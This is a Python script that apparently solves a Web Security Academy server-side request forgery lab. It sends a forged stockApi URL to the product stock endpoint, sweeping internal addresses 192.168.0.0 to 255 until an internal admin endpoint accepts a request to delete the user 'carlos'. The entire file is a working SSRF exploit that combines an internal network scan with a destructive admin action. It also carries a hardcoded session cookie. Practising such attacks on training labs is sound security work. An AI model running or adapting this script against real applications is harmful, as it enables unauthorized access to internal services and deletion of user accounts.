import requests
import time

start = time.perf_counter()

found = False


def run_request(num):

    cookies = {
        'session': '2JhC6YF1ryS7jOjAkK9n9N2DCdCqsLvO',
        'SL_G_WPT_TO': 'en',
        'SL_GWPT_Show_Hide_tmp': '1',
        'SL_wptGlobTipTmp': '1',
    }

    headers = {
        'Host': '0a8600320460cf62c0292098003a003a.web-security-academy.net',
        # 'Content-Length': '96',
        'Dnt': '1',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
        'Sec-Ch-Ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'Origin': 'https://0a8600320460cf62c0292098003a003a.web-security-academy.net',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://0a8600320460cf62c0292098003a003a.web-security-academy.net/product?productId=1',
        'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
        'Connection': 'close',

    }

    data = f'stockApi=http://192.168.0.{num}:8080/admin/delete?username=carlos'

    response = requests.post('https://0a8600320460cf62c0292098003a003a.web-security-academy.net/product/stock',
                             cookies=cookies, headers=headers, data=data)
    print(num, response.status_code)

    if response.status_code == 200:

        global found
        found = True


for i in range(256):
    run_request(i)

    if found == True:
        print(f'ip: 192.168.0.{i}')
        print('carlos deleted')
        break

end = time.perf_counter()


print(f'\nfinished in {round(end - start,3)}s')
